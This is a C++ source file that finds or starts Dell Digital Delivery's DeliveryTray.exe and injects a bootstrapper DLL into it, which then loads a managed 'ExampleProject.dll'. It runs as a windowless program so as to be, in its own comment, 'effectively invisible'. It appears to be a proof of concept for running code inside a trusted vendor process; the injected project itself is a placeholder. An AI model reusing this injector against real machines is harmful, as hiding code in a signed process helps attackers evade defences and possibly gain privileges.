#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <stdlib.h>
#include <string>

#include "Injection.h"

using namespace std;

DWORD LoadDeliveryTray();

void true_main() {
    // Bootstrapper
    char DllName[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, DllName);
    strcat_s(DllName, "\\Bootstrapper.dll");

    // ExampleProject
    wchar_t DllNameW[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, DllNameW);
    wcscat_s(DllNameW, L"\\ExampleProject.dll");
    
    DWORD Pid = GetProcessIdByName("DeliveryTray.exe");
	if (Pid == NULL)
		// couldn't find it, load
		Pid = LoadDeliveryTray();

    InjectAndRunThenUnload(Pid, DllName, "LoadManagedProject", DllNameW);
}

// assuming you're running on an x64 machine, update the path if x86..
DWORD LoadDeliveryTray()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD dwPid;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(L"C:\\Program Files (x86)\\Dell Digital Delivery\\DeliveryTray.exe",
		L"C:\\Program Files (x86)\\Dell Digital Delivery\\DeliveryTray.exe",
		NULL, NULL, false, CREATE_BREAKAWAY_FROM_JOB, NULL, NULL,
		&si, &pi)) {
		printf("Couldn't find DeliveryTray.exe?\n");
		dwPid = NULL;
	}
	else
		dwPid = pi.dwProcessId;

	return dwPid;
}

/* By starting as a Windows application but not displaying any
 * windows, we can become effectively invisible.
 */
int __stdcall WinMain (HINSTANCE hInstance,
                       HINSTANCE hPrevInstance,
                       LPSTR lpCmdLine,
                       int cmdShow)
{
    true_main();
    return 0;
}

/* In any case, it's useful to have a console window visible
 * for debugging purposes.  Use cout to your heart's content!
 */
int main()
{
    true_main();
    return 0;
}
